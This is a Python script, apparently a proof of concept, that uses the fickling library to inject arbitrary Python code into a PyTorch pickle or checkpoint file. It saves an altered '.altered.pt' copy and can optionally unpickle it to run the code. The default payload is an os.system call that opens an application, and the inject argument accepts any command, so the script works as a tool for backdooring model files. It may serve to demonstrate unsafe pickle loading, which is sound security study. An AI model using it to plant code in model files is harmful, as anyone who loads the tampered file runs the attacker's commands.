import pickletools
from fickling.fickle import Pickled
import pickle
from loguru import logger


def try_open(file: str) -> bytes:
    try:
        with open(file, "rb") as f:
            pickletools.dis(f)
            return f.read()
    except UnicodeDecodeError:
        logger.info(
            "This isn't a pickle, PyTorch may have used `_use_new_zipfile_serialization`, trying to unzip..."
        )
        from zipfile import ZipFile

        try:

            def extract_zip(input_zip):
                input_zip = ZipFile(input_zip)
                return [
                    input_zip.read(name)
                    for name in input_zip.namelist()
                    if ".pkl" in name
                ]

            files = extract_zip(file)
            from io import BytesIO

            file_like = BytesIO(files[0])
            pickletools.dis(file_like)
            file_like.seek(0)
            return file_like.read()
        except Exception as e:
            raise e

    except Exception as e:
        logger.error(e)
        raise e


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--inject",
        type=str,
        default='import os; os.system("open /Applications/Minecraft.app")',
    )
    parser.add_argument(
        "--file", type=str, default="02b145e38790e52c2161b8d5ed97ee967bc3307e"
    )
    parser.add_argument("--view", action="store_true", default=False)

    parser.add_argument("--execute", action="store_true", default=False)

    args = parser.parse_args()

    try_open(args.file)

    if args.view:
        with open(args.file, "rb") as f:
            pickletools.dis(f)

    with open(args.file, "rb") as f:
        p = Pickled.load(f)

    p.insert_python_exec(args.inject)

    new_filename = f"{args.file}.altered.pt"
    with open(new_filename, "wb") as f:
        p.dump(f)

    if args.execute:
        with open(new_filename, "rb") as f:
            data = pickle.loads(f.read())
            print(data)
